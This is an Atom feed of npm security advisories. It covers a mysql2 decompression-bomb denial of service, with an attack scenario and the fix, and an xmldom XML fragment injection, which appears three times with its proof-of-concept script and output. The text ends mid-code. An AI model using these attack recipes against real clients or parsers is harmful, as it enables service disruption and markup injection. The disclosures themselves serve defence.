<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-09-02T15:33:03.371Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[mysql2] MySQL2: Unbounded zlib inflate in compressed MySQL protocol handler allows decompression-bomb DoS]]></title>
        <id>https://github.com/advisories/GHSA-rgwj-5xj2-c3m3</id>
        <link href="https://github.com/advisories/GHSA-rgwj-5xj2-c3m3"/>
        <updated>2026-09-02T15:28:47.000Z</updated>
        <content type="html"><![CDATA[<h2 id="vulnerability-details">Vulnerability Details</h2>
<p><strong>File</strong>: <code>lib/compressed_protocol.js</code>
<strong>Line</strong>: 43 (<code>zlib.inflate(body, (err, data) =&gt; { ... })</code> inside <code>handleCompressedPacket</code>)</p>
<h3 id="root-cause">Root Cause</h3>
<p>When a connection is created with <code>compress: true</code> (and the server advertises <code>CLIENT_COMPRESS</code>), every incoming packet is unwrapped by <code>handleCompressedPacket()</code> in <code>lib/compressed_protocol.js</code>, which calls:</p>
<pre><code class="language-js">zlib.inflate(body, (err, data) =&gt; { ... });
</code></pre>
<p>No options object (in particular, no <code>maxOutputLength</code>) is passed. Node's zlib convenience methods default <code>maxOutputLength</code> to <code>buffer.kMaxLength</code>, which on this platform is <code>Number.MAX_SAFE_INTEGER</code> — i.e. effectively unbounded until the process runs out of memory. The 3-byte "length of payload before compression" field in the compressed-packet header is read (<code>packet.readInt24()</code>) but is only used to branch on <code>!== 0</code>; it is never used to cap or validate the actual inflate output size, and the real decompressed size is determined purely by the attacker-supplied deflate stream.</p>
<p>Because DEFLATE can reach compression ratios over 1000:1 for crafted repetitive input, an attacker who controls (or MITMs, on a non-TLS connection) the MySQL server endpoint can send a single small compressed packet that expands to gigabytes in the client's memory — a classic decompression-bomb / "zip bomb" applied to MySQL's client-compression protocol.</p>
<h3 id="attack-scenario">Attack Scenario</h3>
<ol>
<li>Application connects with <code>mysql2</code>/<code>mysql2/promise</code> using <code>compress: true</code> (a documented option for reducing bandwidth, commonly used for cloud/WAN DB connections).</li>
<li>The connection target is attacker-controlled or attacker-compromised, or an attacker MITMs a non-TLS connection.</li>
<li>Right after authentication succeeds, the malicious endpoint sends one crafted compressed packet whose deflate stream is small on the wire (hundreds of KB) but decompresses to several GB.</li>
<li><code>zlib.inflate()</code> starts allocating memory for the full decompressed output with no ceiling.</li>
<li>The Node.js process's RSS grows uncontrolled until OOM-kill or crash — no query needs to be issued by the client; the malicious packet alone is enough.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>Denial of Service of the client application (process crash / OOM) — not the database itself. No authentication bypass or data exposure. Requires <code>compress: true</code> plus a malicious/compromised server or MITM position.</p>
<h3 id="vulnerable-code">Vulnerable Code</h3>
<pre><code class="language-js">function handleCompressedPacket(packet) {
  const connection = this;
  const deflatedLength = packet.readInt24();
  const body = packet.readBuffer();

  if (deflatedLength !== 0) {
    connection.inflateQueue.push((task) =&gt; {
      zlib.inflate(body, (err, data) =&gt; {
        if (err) {
          connection._handleNetworkError(err);
          return;
        }
        connection._bumpCompressedSequenceId(packet.numPackets);
        connection._inflatedPacketsParser.execute(data);
        task.done();
      });
    });
  } else {
    ...
  }
}
</code></pre>
<h3 id="recommended-fix">Recommended Fix</h3>
<pre><code class="language-js">const MAX_INFLATED_PACKET_SIZE = 1 * 1024 * 1024 * 1024; // e.g. 1 GiB, ideally configurable

zlib.inflate(body, { maxOutputLength: MAX_INFLATED_PACKET_SIZE }, (err, data) =&gt; {
  if (err) {
    connection._handleNetworkError(err);
    return;
  }
  ...
});
</code></pre>
<p><code>maxOutputLength</code> makes <code>zlib.inflate</code> abort with <code>ERR_BUFFER_TOO_LARGE</code> as soon as the decompressed size would exceed the cap, routing into the exact same (already-existing) <code>err</code> → <code>connection._handleNetworkError(err)</code> path, so no new error-handling logic is required.</p>
<h3 id="verification">Verification</h3>
<p>Dynamically confirmed on v3.23.0 (HEAD) using a minimal rogue "MySQL server" built on node-mysql2's own server-mode helpers (<code>mysql.createServer</code>, <code>Packets.Handshake</code>, <code>connection.writeOk()</code>). The rogue server completes a real handshake advertising <code>CLIENT_COMPRESS</code>, then writes one raw compressed frame (509,604 bytes on the wire — a zlib deflate of 500 MB of zero bytes, ratio 1028.8:1) directly to the socket. A normal <code>mysql.createConnection({ ..., compress: true })</code> victim client — which never issues any query — had its RSS grow from 74.3 MB to 1115.0 MB after receiving that single packet, before erroring out with <code>PROTOCOL_UNEXPECTED_PACKET</code> once the client tried to parse the inflated zero-filled buffer as MySQL packets. The memory allocation happens unconditionally before any content validation.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sidorares/node-mysql2/security/advisories/GHSA-rgwj-5xj2-c3m3">https://github.com/sidorares/node-mysql2/security/advisories/GHSA-rgwj-5xj2-c3m3</a></li>
<li><a href="https://github.com/sidorares/node-mysql2/commit/7c48343c95ecc80d30d6ebfa67875947b7d848d2">https://github.com/sidorares/node-mysql2/commit/7c48343c95ecc80d30d6ebfa67875947b7d848d2</a></li>
<li><a href="https://github.com/sidorares/node-mysql2/releases/tag/v3.23.1">https://github.com/sidorares/node-mysql2/releases/tag/v3.23.1</a></li>
<li><a href="https://github.com/advisories/GHSA-rgwj-5xj2-c3m3">https://github.com/advisories/GHSA-rgwj-5xj2-c3m3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rgwj-5xj2-c3m3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-31T22:36:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[xmldom] xmldom: XML fragment injection via invalid EntityReference.nodeName during requireWellFormed serialization]]></title>
        <id>https://github.com/advisories/GHSA-6gmq-8vp8-gcm6</id>
        <link href="https://github.com/advisories/GHSA-6gmq-8vp8-gcm6"/>
        <updated>2026-09-02T15:18:21.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>An <code>EntityReference</code> node can be created with an invalid, attacker-controlled name through <code>Document.createEntityReference(name)</code>. When this node is serialized directly with:</p>
<pre><code class="language-js">serializer.serializeToString(ref, { requireWellFormed: true })
</code></pre>
<p>the invalid <code>nodeName</code> is emitted into the serialized XML fragment without validation or escaping.</p>
<p>This can produce real XML markup in the serialized output. In the proof of concept below, the serialized fragment contains <code>&lt;injected/&gt;</code>, and reparsing the fragment creates a real <code>injected</code> element.</p>
<hr>
<h2 id="details">Details</h2>
<p>The issue appears to be in the serialization path for <code>ENTITY_REFERENCE_NODE</code>.</p>
<p>For several other node types, <code>requireWellFormed: true</code> performs specific validation checks before serialization. For example, comments, processing instructions, document types, and some character data cases are checked before being emitted.</p>
<p>However, for <code>ENTITY_REFERENCE_NODE</code>, the serializer appears to emit the node name directly in entity reference form:</p>
<pre><code class="language-js">case ENTITY_REFERENCE_NODE:
  buf.push('&amp;', n.nodeName, ';');
  return null;
</code></pre>
<p>As a result, if <code>nodeName</code> contains characters that break out of the intended <code>&amp;name;</code> structure, the serializer can emit additional XML markup.</p>
<p>For example, an entity reference created with the name:</p>
<pre><code class="language-text">safe; &lt;injected/&gt; &amp;x
</code></pre>
<p>is serialized as:</p>
<pre><code class="language-xml">&amp;safe; &lt;injected/&gt; &amp;x;
</code></pre>
<p>When this fragment is later parsed in an XML context, <code>&lt;injected/&gt;</code> becomes a real element.</p>
<p>This is especially surprising when <code>{ requireWellFormed: true }</code> is used, because applications may reasonably treat this mode as the stricter or safer XML serialization mode.</p>
<hr>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>Tested with:</p>
<pre><code class="language-text">@xmldom/xmldom@0.9.10
Node.js v24.18.0
Windows 10 / PowerShell
</code></pre>
<pre><code class="language-js">'use strict';

const { DOMImplementation, XMLSerializer, DOMParser } = require('@xmldom/xmldom');

const impl = new DOMImplementation();
const doc = impl.createDocument(null, 'root', null);
const serializer = new XMLSerializer();

function countInjected(fragment) {
  try {
    const parsed = new DOMParser().parseFromString(`&lt;root&gt;${fragment}&lt;/root&gt;`, 'application/xml');
    return parsed.getElementsByTagName('injected').length;
  } catch (e) {
    return `PARSE_THROW ${e.name}: ${e.message}`;
  }
}

for (const name of [
  'safe',
  'safe; &lt;injected/&gt; &amp;x',
  'x&lt;injected',
  'x y'
]) {
  try {
    const ref = doc.createEntityReference(name);
    const xml = serializer.serializeToString(ref, { requireWellFormed: true });

    console.log(`[SERIALIZED] ${JSON.stringify(name)}: ${xml}`);
    console.log(`[INJECTED_COUNT] ${JSON.stringify(name)}: ${countInjected(xml)}`);
  } catch (e) {
    console.log(`[THROW] ${JSON.stringify(name)}: ${e.name}: ${e.message}`);
  }
}
</code></pre>
<p>Observed output:</p>
<pre><code class="language-text">[SERIALIZED] "safe": &amp;safe;
[INJECTED_COUNT] "safe": 0

[SERIALIZED] "safe; &lt;injected/&gt; &amp;x": &amp;safe; &lt;injected/&gt; &amp;x;
[INJECTED_COUNT] "safe; &lt;injected/&gt; &amp;x": 1

[SERIALIZED] "x&lt;injected": &amp;x&lt;injected;
[INJECTED_COUNT] "x&lt;injected": 0

[SERIALIZED] "x y": &amp;x y;
[INJECTED_COUNT] "x y": 0
</code></pre>
<hr>
<h2 id="impact">Impact</h2>
<p>An application that creates an <code>EntityReference</code> from attacker-controlled input and then serializes that node or XML fragment with <code>requireWellFormed: true</code> may produce XML containing attacker-controlled markup.</p>
<p>The impact is limited by two observations:</p>
<ol>
<li>The parser does not create <code>EntityReference</code> nodes from ordinary XML entity references.</li>
<li>Appending an <code>EntityReference</code> node as an element child is rejected with a <code>HierarchyRequestError</code>.</li>
</ol>
<p>The main affected scenario is applications that directly use <code>createEntityReference(name)</code> and then serialize the resulting node or fragment.</p>
<h2 id="fix-applied">Fix Applied</h2>
<p>Two complementary, non-breaking fixes.
(1) <code>document.createEntityReference(name)</code> rejects an invalid <code>Name</code> at creation, closing the reachable creation vector by default — the opt-in serializer check alone cannot, since a later <code>nodeName</code> mutation would bypass a creation-only guard.
(2) Under <code>requireWellFormed</code>, the serializer validates the <code>EntityReference</code> <code>nodeName</code> as a well-formed XML <code>Name</code> and throws <code>InvalidStateError</code> when it is not; a valid reference still serializes as <code>&amp;name;</code>. Both ship on both maintained versions. The <code>EntityReference</code> / <code>createEntityReference</code> docs note that under <code>requireWellFormed</code> the <code>nodeName</code> is validated as an XML <code>Name</code>, and that xmldom does not expand entities. See the <a href="https://www.w3.org/TR/xml/#NT-Name">XML <code>Name</code> production</a>.</p>
<blockquote>
<p><strong>⚠ Opt-in required.</strong> Protection is not automatic. Existing serialization calls remain
vulnerable unless <code>{ requireWellFormed: true }</code> is explicitly passed. Applications that
serialize untrusted DOM content should audit all <code>serializeToString()</code> call sites and add it.</p>
</blockquote>
<h3 id="proof-of-concept---fixed-path">Proof of Concept - fixed path</h3>
<pre><code class="language-js">'use strict';

const { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');

const impl = new DOMImplementation();
const doc = impl.createDocument(null, 'root', null);
const serializer = new XMLSerializer();

// Creation-time anchor (applied by default): an invalid XML Name is rejected at creation.
try {
  doc.createEntityReference('safe; &lt;injected/&gt; &amp;x');
} catch (e) {
  console.log(`${e.name}`); // rejected at creation
}

// Default path (requireWellFormed omitted): because creation now rejects an ill-formed name,
// an ill-formed nodeName is only reachable via a post-creation mutation — and is emitted verbatim.
const ref = doc.createEntityReference('safe');
ref.nodeName = 'safe; &lt;injected/&gt; &amp;x';
console.log(serializer.serializeToString(ref));
// -&gt; &amp;safe; &lt;injected/&gt; &amp;x;   (injection present on the default path)

// Opt-in path: throws on the invalid nodeName.
try {
  serializer.serializeToString(ref, { requireWellFormed: true });
} catch (e) {
  console.log(`${e.name}`); // InvalidStateError
}

// A valid name still serializes as &amp;name; under requireWellFormed.
const ok = doc.createEntityReference('valid');
console.log(serializer.serializeToString(ok, { requireWellFormed: true }));
// -&gt; &amp;valid;
</code></pre>
<h3 id="why-the-default-stays-verbatim">Why the default stays verbatim</h3>
<p>The creation-time anchor is applied by default, because it is classified non-breaking. The serializer check, by contrast, stays gated behind <code>{ requireWellFormed: true }</code>: W3C DOM Parsing's require-well-formed flag defaults to <code>false</code>, and the browser <code>XMLSerializer</code> emits the <code>nodeName</code> verbatim in that default mode, so unconditionally throwing for an ill-formed <code>EntityReference.nodeName</code> would be an unjustified breaking change — which is why the default serialization path stays verbatim.</p>
<h3 id="residual-limitation">Residual limitation</h3>
<p>The creation vector is closed by default — the non-breaking creation-time anchor — with no further deferred work. The residual is at serialization: the default path still emits an ill-formed <code>nodeName</code> verbatim, because the serializer check is opt-in via <code>{ requireWellFormed: true }</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/xmldom/xmldom/security/advisories/GHSA-6gmq-8vp8-gcm6">https://github.com/xmldom/xmldom/security/advisories/GHSA-6gmq-8vp8-gcm6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-83610">https://nvd.nist.gov/vuln/detail/CVE-2026-83610</a></li>
<li><a href="https://github.com/xmldom/xmldom/pull/1071">https://github.com/xmldom/xmldom/pull/1071</a></li>
<li><a href="https://github.com/xmldom/xmldom/pull/1072">https://github.com/xmldom/xmldom/pull/1072</a></li>
<li><a href="https://github.com/xmldom/xmldom/commit/4664386e4f4d99d17b416a151dbe8323e245284b">https://github.com/xmldom/xmldom/commit/4664386e4f4d99d17b416a151dbe8323e245284b</a></li>
<li><a href="https://github.com/xmldom/xmldom/commit/6c3fb5ffeafe7901ec928ce9010988dd716c94a0">https://github.com/xmldom/xmldom/commit/6c3fb5ffeafe7901ec928ce9010988dd716c94a0</a></li>
<li><a href="https://github.com/xmldom/xmldom/releases/tag/0.8.15">https://github.com/xmldom/xmldom/releases/tag/0.8.15</a></li>
<li><a href="https://github.com/xmldom/xmldom/releases/tag/0.9.12">https://github.com/xmldom/xmldom/releases/tag/0.9.12</a></li>
<li><a href="https://github.com/advisories/GHSA-6gmq-8vp8-gcm6">https://github.com/advisories/GHSA-6gmq-8vp8-gcm6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6gmq-8vp8-gcm6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-02T15:18:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@xmldom/xmldom] xmldom: XML fragment injection via invalid EntityReference.nodeName during requireWellFormed serialization]]></title>
        <id>https://github.com/advisories/GHSA-6gmq-8vp8-gcm6</id>
        <link href="https://github.com/advisories/GHSA-6gmq-8vp8-gcm6"/>
        <updated>2026-09-02T15:18:21.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>An <code>EntityReference</code> node can be created with an invalid, attacker-controlled name through <code>Document.createEntityReference(name)</code>. When this node is serialized directly with:</p>
<pre><code class="language-js">serializer.serializeToString(ref, { requireWellFormed: true })
</code></pre>
<p>the invalid <code>nodeName</code> is emitted into the serialized XML fragment without validation or escaping.</p>
<p>This can produce real XML markup in the serialized output. In the proof of concept below, the serialized fragment contains <code>&lt;injected/&gt;</code>, and reparsing the fragment creates a real <code>injected</code> element.</p>
<hr>
<h2 id="details">Details</h2>
<p>The issue appears to be in the serialization path for <code>ENTITY_REFERENCE_NODE</code>.</p>
<p>For several other node types, <code>requireWellFormed: true</code> performs specific validation checks before serialization. For example, comments, processing instructions, document types, and some character data cases are checked before being emitted.</p>
<p>However, for <code>ENTITY_REFERENCE_NODE</code>, the serializer appears to emit the node name directly in entity reference form:</p>
<pre><code class="language-js">case ENTITY_REFERENCE_NODE:
  buf.push('&amp;', n.nodeName, ';');
  return null;
</code></pre>
<p>As a result, if <code>nodeName</code> contains characters that break out of the intended <code>&amp;name;</code> structure, the serializer can emit additional XML markup.</p>
<p>For example, an entity reference created with the name:</p>
<pre><code class="language-text">safe; &lt;injected/&gt; &amp;x
</code></pre>
<p>is serialized as:</p>
<pre><code class="language-xml">&amp;safe; &lt;injected/&gt; &amp;x;
</code></pre>
<p>When this fragment is later parsed in an XML context, <code>&lt;injected/&gt;</code> becomes a real element.</p>
<p>This is especially surprising when <code>{ requireWellFormed: true }</code> is used, because applications may reasonably treat this mode as the stricter or safer XML serialization mode.</p>
<hr>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>Tested with:</p>
<pre><code class="language-text">@xmldom/xmldom@0.9.10
Node.js v24.18.0
Windows 10 / PowerShell
</code></pre>
<pre><code class="language-js">'use strict';

const { DOMImplementation, XMLSerializer, DOMParser } = require('@xmldom/xmldom');

const impl = new DOMImplementation();
const doc = impl.createDocument(null, 'root', null);
const serializer = new XMLSerializer();

function countInjected(fragment) {
  try {
    const parsed = new DOMParser().parseFromString(`&lt;root&gt;${fragment}&lt;/root&gt;`, 'application/xml');
    return parsed.getElementsByTagName('injected').length;
  } catch (e) {
    return `PARSE_THROW ${e.name}: ${e.message}`;
  }
}

for (const name of [
  'safe',
  'safe; &lt;injected/&gt; &amp;x',
  'x&lt;injected',
  'x y'
]) {
  try {
    const ref = doc.createEntityReference(name);
    const xml = serializer.serializeToString(ref, { requireWellFormed: true });

    console.log(`[SERIALIZED] ${JSON.stringify(name)}: ${xml}`);
    console.log(`[INJECTED_COUNT] ${JSON.stringify(name)}: ${countInjected(xml)}`);
  } catch (e) {
    console.log(`[THROW] ${JSON.stringify(name)}: ${e.name}: ${e.message}`);
  }
}
</code></pre>
<p>Observed output:</p>
<pre><code class="language-text">[SERIALIZED] "safe": &amp;safe;
[INJECTED_COUNT] "safe": 0

[SERIALIZED] "safe; &lt;injected/&gt; &amp;x": &amp;safe; &lt;injected/&gt; &amp;x;
[INJECTED_COUNT] "safe; &lt;injected/&gt; &amp;x": 1

[SERIALIZED] "x&lt;injected": &amp;x&lt;injected;
[INJECTED_COUNT] "x&lt;injected": 0

[SERIALIZED] "x y": &amp;x y;
[INJECTED_COUNT] "x y": 0
</code></pre>
<hr>
<h2 id="impact">Impact</h2>
<p>An application that creates an <code>EntityReference</code> from attacker-controlled input and then serializes that node or XML fragment with <code>requireWellFormed: true</code> may produce XML containing attacker-controlled markup.</p>
<p>The impact is limited by two observations:</p>
<ol>
<li>The parser does not create <code>EntityReference</code> nodes from ordinary XML entity references.</li>
<li>Appending an <code>EntityReference</code> node as an element child is rejected with a <code>HierarchyRequestError</code>.</li>
</ol>
<p>The main affected scenario is applications that directly use <code>createEntityReference(name)</code> and then serialize the resulting node or fragment.</p>
<h2 id="fix-applied">Fix Applied</h2>
<p>Two complementary, non-breaking fixes.
(1) <code>document.createEntityReference(name)</code> rejects an invalid <code>Name</code> at creation, closing the reachable creation vector by default — the opt-in serializer check alone cannot, since a later <code>nodeName</code> mutation would bypass a creation-only guard.
(2) Under <code>requireWellFormed</code>, the serializer validates the <code>EntityReference</code> <code>nodeName</code> as a well-formed XML <code>Name</code> and throws <code>InvalidStateError</code> when it is not; a valid reference still serializes as <code>&amp;name;</code>. Both ship on both maintained versions. The <code>EntityReference</code> / <code>createEntityReference</code> docs note that under <code>requireWellFormed</code> the <code>nodeName</code> is validated as an XML <code>Name</code>, and that xmldom does not expand entities. See the <a href="https://www.w3.org/TR/xml/#NT-Name">XML <code>Name</code> production</a>.</p>
<blockquote>
<p><strong>⚠ Opt-in required.</strong> Protection is not automatic. Existing serialization calls remain
vulnerable unless <code>{ requireWellFormed: true }</code> is explicitly passed. Applications that
serialize untrusted DOM content should audit all <code>serializeToString()</code> call sites and add it.</p>
</blockquote>
<h3 id="proof-of-concept---fixed-path">Proof of Concept - fixed path</h3>
<pre><code class="language-js">'use strict';

const { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');

const impl = new DOMImplementation();
const doc = impl.createDocument(null, 'root', null);
const serializer = new XMLSerializer();

// Creation-time anchor (applied by default): an invalid XML Name is rejected at creation.
try {
  doc.createEntityReference('safe; &lt;injected/&gt; &amp;x');
} catch (e) {
  console.log(`${e.name}`); // rejected at creation
}

// Default path (requireWellFormed omitted): because creation now rejects an ill-formed name,
// an ill-formed nodeName is only reachable via a post-creation mutation — and is emitted verbatim.
const ref = doc.createEntityReference('safe');
ref.nodeName = 'safe; &lt;injected/&gt; &amp;x';
console.log(serializer.serializeToString(ref));
// -&gt; &amp;safe; &lt;injected/&gt; &amp;x;   (injection present on the default path)

// Opt-in path: throws on the invalid nodeName.
try {
  serializer.serializeToString(ref, { requireWellFormed: true });
} catch (e) {
  console.log(`${e.name}`); // InvalidStateError
}

// A valid name still serializes as &amp;name; under requireWellFormed.
const ok = doc.createEntityReference('valid');
console.log(serializer.serializeToString(ok, { requireWellFormed: true }));
// -&gt; &amp;valid;
</code></pre>
<h3 id="why-the-default-stays-verbatim">Why the default stays verbatim</h3>
<p>The creation-time anchor is applied by default, because it is classified non-breaking. The serializer check, by contrast, stays gated behind <code>{ requireWellFormed: true }</code>: W3C DOM Parsing's require-well-formed flag defaults to <code>false</code>, and the browser <code>XMLSerializer</code> emits the <code>nodeName</code> verbatim in that default mode, so unconditionally throwing for an ill-formed <code>EntityReference.nodeName</code> would be an unjustified breaking change — which is why the default serialization path stays verbatim.</p>
<h3 id="residual-limitation">Residual limitation</h3>
<p>The creation vector is closed by default — the non-breaking creation-time anchor — with no further deferred work. The residual is at serialization: the default path still emits an ill-formed <code>nodeName</code> verbatim, because the serializer check is opt-in via <code>{ requireWellFormed: true }</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/xmldom/xmldom/security/advisories/GHSA-6gmq-8vp8-gcm6">https://github.com/xmldom/xmldom/security/advisories/GHSA-6gmq-8vp8-gcm6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-83610">https://nvd.nist.gov/vuln/detail/CVE-2026-83610</a></li>
<li><a href="https://github.com/xmldom/xmldom/pull/1071">https://github.com/xmldom/xmldom/pull/1071</a></li>
<li><a href="https://github.com/xmldom/xmldom/pull/1072">https://github.com/xmldom/xmldom/pull/1072</a></li>
<li><a href="https://github.com/xmldom/xmldom/commit/4664386e4f4d99d17b416a151dbe8323e245284b">https://github.com/xmldom/xmldom/commit/4664386e4f4d99d17b416a151dbe8323e245284b</a></li>
<li><a href="https://github.com/xmldom/xmldom/commit/6c3fb5ffeafe7901ec928ce9010988dd716c94a0">https://github.com/xmldom/xmldom/commit/6c3fb5ffeafe7901ec928ce9010988dd716c94a0</a></li>
<li><a href="https://github.com/xmldom/xmldom/releases/tag/0.8.15">https://github.com/xmldom/xmldom/releases/tag/0.8.15</a></li>
<li><a href="https://github.com/xmldom/xmldom/releases/tag/0.9.12">https://github.com/xmldom/xmldom/releases/tag/0.9.12</a></li>
<li><a href="https://github.com/advisories/GHSA-6gmq-8vp8-gcm6">https://github.com/advisories/GHSA-6gmq-8vp8-gcm6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6gmq-8vp8-gcm6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-02T15:18:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@xmldom/xmldom] xmldom: XML fragment injection via invalid EntityReference.nodeName during requireWellFormed serialization]]></title>
        <id>https://github.com/advisories/GHSA-6gmq-8vp8-gcm6</id>
        <link href="https://github.com/advisories/GHSA-6gmq-8vp8-gcm6"/>
        <updated>2026-09-02T15:18:21.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>An <code>EntityReference</code> node can be created with an invalid, attacker-controlled name through <code>Document.createEntityReference(name)</code>. When this node is serialized directly with:</p>
<pre><code class="language-js">serializer.serializeToString(ref, { requireWellFormed: true })
</code></pre>
<p>the invalid <code>nodeName</code> is emitted into the serialized XML fragment without validation or escaping.</p>
<p>This can produce real XML markup in the serialized output. In the proof of concept below, the serialized fragment contains <code>&lt;injected/&gt;</code>, and reparsing the fragment creates a real <code>injected</code> element.</p>
<hr>
<h2 id="details">Details</h2>
<p>The issue appears to be in the serialization path for <code>ENTITY_REFERENCE_NODE</code>.</p>
<p>For several other node types, <code>requireWellFormed: true</code> performs specific validation checks before serialization. For example, comments, processing instructions, document types, and some character data cases are checked before being emitted.</p>
<p>However, for <code>ENTITY_REFERENCE_NODE</code>, the serializer appears to emit the node name directly in entity reference form:</p>
<pre><code class="language-js">case ENTITY_REFERENCE_NODE:
  buf.push('&amp;', n.nodeName, ';');
  return null;
</code></pre>
<p>As a result, if <code>nodeName</code> contains characters that break out of the intended <code>&amp;name;</code> structure, the serializer can emit additional XML markup.</p>
<p>For example, an entity reference created with the name:</p>
<pre><code class="language-text">safe; &lt;injected/&gt; &amp;x
</code></pre>
<p>is serialized as:</p>
<pre><code class="language-xml">&amp;safe; &lt;injected/&gt; &amp;x;
</code></pre>
<p>When this fragment is later parsed in an XML context, <code>&lt;injected/&gt;</code> becomes a real element.</p>
<p>This is especially surprising when <code>{ requireWellFormed: true }</code> is used, because applications may reasonably treat this mode as the stricter or safer XML serialization mode.</p>
<hr>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>Tested with:</p>
<pre><code class="language-text">@xmldom/xmldom@0.9.10
Node.js v24.18.0
Windows 10 / PowerShell
</code></pre>
<pre><code class="language-js">'use strict';

const { DOMImplementation, XMLSerializer, DOMParser } = require('@xmldom/xmldom');

const impl = new DOMImplementation();
const doc = impl.createDocument(null, 'root', null);
const serializer = new XMLSerializer();

function countInjected(fragment) {
  try {
    const parsed = new DOMParser().parseFromString(`&lt;root&gt;${fragment}&lt;/root&gt;`, 'application/xml');
    return parsed.getElementsByTagName('injected').length;
  } catch (e) {
    return `PARSE_THROW ${e.name}: ${e.message}`;
  }
}

for (const name of [
  'safe',
  'safe; &lt;injected/&gt; &amp;x',
  'x&lt;injected',
  'x y'
]) {
  try {
    const ref = doc.createEntityReference(name);
    const xml = serializer.serializeToString(ref, { requireWellFormed: true });

    console.log(`[SERIALIZED] ${JSON.stringify(name)}: ${xml}`);
    console.log(`[INJECTED_COUNT] ${JSON.stringify(name)}: ${countInjected(xml)}`);
  } catch (e) {
    console.log(`[THROW] ${JSON.stringify(name)}: ${e.name}: ${e.message}`);
  }
}
</code></pre>
<p>Observed output:</p>
<pre><code class="language-text">[SERIALIZED] "safe": &amp;safe;
[INJECTED_COUNT] "safe": 0

[SERIALIZED] "safe; &lt;injected/&gt; &amp;x": &amp;safe; &lt;injected/&gt; &amp;x;
[INJECTED_COUNT] "safe; &lt;injected/&gt; &amp;x": 1

[SERIALIZED] "x&lt;injected": &amp;x&lt;injected;
[INJECTED_COUNT] "x&lt;injected": 0

[SERIALIZED] "x y": &amp;x y;
[INJECTED_COUNT] "x y": 0
</code></pre>
<hr>
<h2 id="impact">Impact</h2>
<p>An application that creates an <code>EntityReference</code> from attacker-controlled input and then serializes that node or XML fragment with <code>requireWellFormed: true</code> may produce XML containing attacker-controlled markup.</p>
<p>The impact is limited by two observations:</p>
<ol>
<li>The parser does not create <code>EntityReference</code> nodes from ordinary XML entity references.</li>
<li>Appending an <code>EntityReference</code> node as an element child is rejected with a <code>HierarchyRequestError</code>.</li>
</ol>
<p>The main affected scenario is applications that directly use <code>createEntityReference(name)</code> and then serialize the resulting node or fragment.</p>
<h2 id="fix-applied">Fix Applied</h2>
<p>Two complementary, non-breaking fixes.
(1) <code>document.createEntityReference(name)</code> rejects an invalid <code>Name</code> at creation, closing the reachable creation vector by default — the opt-in serializer check alone cannot, since a later <code>nodeName</code> mutation would bypass a creation-only guard.
(2) Under <code>requireWellFormed</code>, the serializer validates the <code>EntityReference</code> <code>nodeName</code> as a well-formed XML <code>Name</code> and throws <code>InvalidStateError</code> when it is not; a valid reference still serializes as <code>&amp;name;</code>. Both ship on both maintained versions. The <code>EntityReference</code> / <code>createEntityReference</code> docs note that under <code>requireWellFormed</code> the <code>nodeName</code> is validated as an XML <code>Name</code>, and that xmldom does not expand entities. See the <a href="https://www.w3.org/TR/xml/#NT-Name">XML <code>Name</code> production</a>.</p>
<blockquote>
<p><strong>⚠ Opt-in required.</strong> Protection is not automatic. Existing serialization calls remain
vulnerable unless <code>{ requireWellFormed: true }</code> is explicitly passed. Applications that
serialize untrusted DOM content should audit all <code>serializeToString()</code> call sites and add it.</p>
</blockquote>
<h3 id="proof-of-concept---fixed-path">Proof of Concept - fixed path</h3>
<pre><code class="language-js">'use strict';

const { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');

const impl = new DOMImplementation();
const doc = impl.createDocument(null, 'root', null);
const serializer = new XMLSerializer();

// Creation-time anchor (applied by default): an invalid XML Name is rejected at creation.
try {
  doc.createEntityReference('safe; &lt;injected/&gt; &amp;x');
} catch (e) {
  console.log(`${e.name}`); // rejected at creation
}

// Default path (requireWellFormed omitted): because creation now rejects an ill-formed name,
// an ill-formed nodeName is only reachable via a post-creation mutation — and is emitted verbatim.
const ref = doc.createEntityReference('safe');
ref.nodeName = 'safe; &lt;injected/&gt; &amp;x';
console.log(serializer.serializeToString(ref));
// -&gt; &amp;safe; &lt;injected/&gt; &amp;x;   (injection present on the default path)

// Opt-in path: throws on the invalid nodeName.
try {
  serializer.serializeToString(ref, { requireWellFormed: true });
} catch (e) {
